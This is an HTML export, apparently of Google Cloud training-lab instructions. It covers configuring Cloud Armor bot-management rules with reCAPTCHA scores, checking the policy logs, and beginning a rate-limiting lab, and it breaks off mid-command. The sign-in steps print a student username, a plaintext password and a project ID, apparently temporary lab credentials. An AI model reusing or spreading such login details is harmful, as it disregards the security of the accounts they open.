ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies update recaptcha-policy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --recaptcha-redirect-site-key "CHALLENGE-PAGE-KEY"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add a bot management rule to allow traffic if the url path matches good-score.html and has a score greater than 0.4:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 2000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy recaptcha-policy\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --expression "request.path.matches('good-score.html') &amp;&amp; &nbsp;  token.recaptcha_session.score &gt; 0.4"\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action allow</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add a bot management rule to deny traffic if the url path matches bad-score.html and has a score less than 0.6:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 3000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy recaptcha-policy\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --expression "request.path.matches('bad-score.html') &amp;&amp; token.recaptcha_session.score &lt; 0.6"\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action "deny-403"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add a bot management rule to redirect traffic to Google reCAPTCHA if the url path matches median-score.html and has a score equal to 0.5:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute security-policies rules create 1000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy recaptcha-policy\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --expression "request.path.matches('median-score.html') &amp;&amp; token.recaptcha_session.score == 0.5"\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --action redirect \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --redirect-type google-recaptcha</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Attach the security policy to the backend service </span><code>http-backend</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services update http-backend \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --security-policy recaptcha-policy --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu &gt; Network Security &gt; Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><code>recaptcha-policy</code><span>.</span></p></li></ol><p><span>Your policy should resemble the following:</span></p><p><img src="https://cdn.qwiklabs.com/MUo8wSm0AeKcnKWcTUGeKggj%2BMTo7zMfpjCvk4qh52c%3D" referrerpolicy="no-referrer" alt="Rules tabbed page, which lists several actions and their priority"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create Cloud Armor security policy rules for Bot Management</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-6-validate-bot-management-with-cloud-armor'><span>Task 6. Validate Bot Management with Cloud Armor</span></h3><ol start='' ><li><p><span>Open up a browser and enter the url </span><code>http://[LB_IP_v4]/index.html</code><span>. Navigate to </span><strong><span>&quot;Visit allowed link&quot;</span></strong><span>.</span></p></li></ol><p><img src="images/P1Pds%2BhAsOsycMJebzf42l9VHjvuaPQfP83bHWDGzTQ%3D.png" referrerpolicy="no-referrer" alt="The good-score web page, which displays the text 'Congrats! You have a good score!'"></p><ol start='' ><li><p><span>Open a new window in Incognito mode to ensure you have a new session.</span></p></li><li><p><span>Enter the url </span><code>http://[LB_IP_v4]/index.html</code><span> and navigate to </span><strong><span>&quot;Visit blocked link&quot;</span></strong><span>. You should receive a </span><strong><span>HTTP 403</span></strong><span> error:</span></p></li></ol><p><img src="images/9i7F%2FqK%2BZGRx7uygrWvBfAASRtqCrheiudDynmPZNas%3D.png" referrerpolicy="no-referrer" alt="The error message '403 Forbidden'"></p><ol start='' ><li><p><span>Open a new window in Incognito mode to ensure you have a new session.</span></p></li><li><p><span>Enter the url </span><code>http://[LB_IP_v4]/index.html</code><span> and navigate to </span><strong><span>&quot;Visit redirect link&quot;</span></strong><span>. You should see the redirection to Google reCAPTCHA and the manual challenge page as below:</span></p></li></ol><p><img src="images/yAOj0fZVtc1LUyQgrla3AJj1ukhDVXERnQ%2FPwAULteA%3D.png" referrerpolicy="no-referrer" alt="Google reCAPTCHA dialog"></p><p><strong><span>Note:</span></strong><span> If the user interaction passes the assessment, reCAPTCHA Enterprise issues an exemption cookie. The browser attaches this exemption cookie to the user&#39;s subsequent requests to the same site until the cookie expires. By default, the exemption cookie expires after three hours.</span></p><p><strong><span>Note:</span></strong><span> To prevent automated software from participating in abusive actions on your site, reCAPTCHA uses an advanced risk analysis engine and adaptive CAPTCHAs. It accomplishes this while allowing your valid users to pass through with ease. If the algorithm believes you are a human, it will validate the reCaptcha without additional action from you. If not, it will display a variety of images that you must categorize before proceeding. Only the most suspect traffic will be requested to solve a captcha by default. If you are not served with a challenge to solve, you can still check the policy logs and verify that you were exempted from solving a challenge.</span></p><h4 id='verify-cloud-armor-logs'><span>Verify Cloud Armor logs</span></h4><p><span>Explore the security policy logs to validate bot management worked as expected.</span></p><ol start='' ><li><p><span>In the console, navigate to </span><strong><span>Navigation menu &gt; Network Security &gt; Cloud Armor</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>recaptcha-policy</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span>.</span></p></li><li><p><span>Below is the MQL(monitoring query language) query, copy and paste into the query editor:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">resource.type:(http_load_balancer) AND jsonPayload.enforcedSecurityPolicy.name:(recaptcha-policy)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now click </span><strong><span>Run Query</span></strong><span>.</span></p></li><li><p><span>Look for a log entry in Query results where the request is for </span><code>http://[LB_IP_v4]/good-score.html</code><span>. Expand jsonPayload.Expand enforcedSecurityPolicy.</span></p></li></ol><p><img src="images/%2B%2F23uHRDBxuG1FsCvn4FnsgdACURikUnexbEqfyzk%2FM%3D.png" referrerpolicy="no-referrer" alt="The expanded jsonPayload.Expand enforcedSecurityPolicy and highlighted html"></p><p><strong><span>Note:</span></strong><span> If you are not seeing log entries, wait a couple of minutes for the policy to propagate, refresh the URLs you used earlier, then check the logs again.</span></p><ol start='' ><li><p><span>Repeat the same for </span><code>http://[LB_IP_v4]/bad-score.html</code><span> and </span><code>http://[LB_IP_v4]/median-score.html</code><span>.</span></p></li></ol><p><img src="images/hUuMWSm6%2Fzp5JgNQCjayWprE6pnDkmz4Zj5%2B99lUSGs%3D.png" referrerpolicy="no-referrer" alt="The expanded security policy and request data for the bad-score link"></p><p><img src="images/652z3yZfcsUfKGsUkhtTPEtD3AVDVpcxNWYlgbHhDWE%3D.png" referrerpolicy="no-referrer" alt="The expanded security policy and request data for the median-score link"></p><p><span>Notice that the </span><code>configuredAction</code><span> is set to </span><strong><span>ALLOW, DENY or GOOGLE_RECAPTCHA</span></strong><span> with the name </span><strong><span>recaptcha-policy</span></strong><span>.</span></p><p><strong><span>Note:</span></strong><span> Cloud Armor security policies create logs that can be explored to determine when traffic is denied and when it is allowed, along with the source of the traffic.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Validate bot management with Cloud Armor</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='congratulations-21'><span>Congratulations!</span></h3><p><span>You successfully implemented bot management with Cloud Armor. You configured an HTTP Load Balancer. Then, you created and implemented reCAPTCHA session token site key on a webpage. You also created a challenge-page site key. You set up Cloud Armor Bot management policy and validated how they handle requests based on the rules. You explored the security policy logs to identify why the traffic was allowed, blocked or redirected.</span></p><p>&nbsp;</p><h2 id='lab---rate-limiting-with-cloud-armor'><span>LAB - Rate Limiting with Cloud Armor</span></h2><h3 id='overview-25'><span>Overview</span></h3><p><span>Google Cloud HTTP(S) load balancing is implemented at the edge of Google&#39;s network in Google&#39;s points of presence (POP) around the world. User traffic directed to an HTTP(S) load balancer enters the POP closest to the user and is then load balanced over Google&#39;s global network to the closest backend that has sufficient capacity available.</span></p><p><span>Cloud Armor IP allowlist/denylist enable you to restrict or allow access to your HTTP(S) load balancer at the edge of the Google Cloud, as close as possible to the user and to malicious traffic. This prevents malicious users or traffic from consuming resources or entering your virtual private cloud (VPC) networks.</span></p><p><span>In this lab, you configure an HTTP Load Balancer with global backends, as shown in the diagram below. Then, you&#39;ll stress test the Load Balancer and add a Cloud Armor rate limiting policy to restrict based on IP.</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram"></p><h4 id='what-youll-learn-3'><span>What you&#39;ll learn</span></h4><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Create HTTP and health check firewall rules</span></p></li><li><p><span>Configure two instance templates</span></p></li><li><p><span>Create two managed instance groups</span></p></li><li><p><span>Configure an HTTP Load Balancer with IPv4 and IPv6</span></p></li><li><p><span>Stress test an HTTP Load Balancer</span></p></li><li><p><span>Add a Cloud Armor rate limiting policy to restrict based on IP</span></p></li><li><p><span>Verify that traffic is getting blocked when running a stress test from a VM</span></p></li></ul><h3 id='setup-and-requirements-22'><span>Setup and requirements</span></h3><h4 id='before-you-click-the-start-lab-button-8'><span>Before you click the Start Lab button</span></h4><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h4 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-4'><span>How to start your lab and sign in to the Google Cloud console</span></h4><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-02-228103688975@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7kFwx0bs7ZSo</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h4 id='activate-cloud-shell'><span>Activate Cloud Shell</span></h4><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-03-7acbbdef9b9d</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-03-7acbbdef9b9d</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth 